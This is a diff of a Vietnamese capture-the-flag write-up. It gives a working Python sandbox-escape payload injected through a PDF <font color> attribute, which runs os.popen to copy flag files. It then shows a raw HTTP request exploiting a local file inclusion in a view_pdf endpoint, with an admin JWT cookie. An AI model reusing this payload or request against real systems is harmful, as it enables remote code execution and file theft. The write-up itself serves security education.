@@ -88,7 +88,7 @@ Challenge đã filter `pow` và `system` nên ta sẽ đổi thành `popen` và 
 
 Final payload:
 ```
-<para> <font color="[ [ getattr(type,Word('__globals__'))['os'].popen('cat /flag*.txt > /tmp/hehe.pdf').read() for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">                exploit                </font>            </para>
+<para> <font color="[ [ getattr(type,Word('__globals__'))['os'].popen('cat /flag*.txt > /tmp/hehe.pdf').read() for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'"> exploit </font> </para>
 ```
 
 ### LFI 
@@ -117,10 +117,10 @@ def view_pdf():
         return send_file(os.path.join(UPLOAD_FOLDER, pdf_filename), as_attachment=False)
 ```
 
-Đoạn code này bị LFI nên có thể đọc file bất kỳ, vậy exccute đưa flag ra `/tmp/hehe.pdf` và đọc file flag là xong
+Đoạn code này bị LFI nên có thể đọc file bất kỳ, vậy exccute đưa flag ra `/tmp/konosec.pdf` và đọc file flag là xong
 
 ```
-GET /view_pdf?f=/tmp/hehe.pdf HTTP/2
+GET /view_pdf?f=/tmp/konosec.pdf HTTP/2
 Host: hells.ehc-fptu.club
 Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJ0cnVuZ3BxIiwiaXNfYWRtaW4iOjF9.xhq-NmIQhPKFkV2Ua19nfn9esgEYIo2LvAac6g5kmvs
 Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
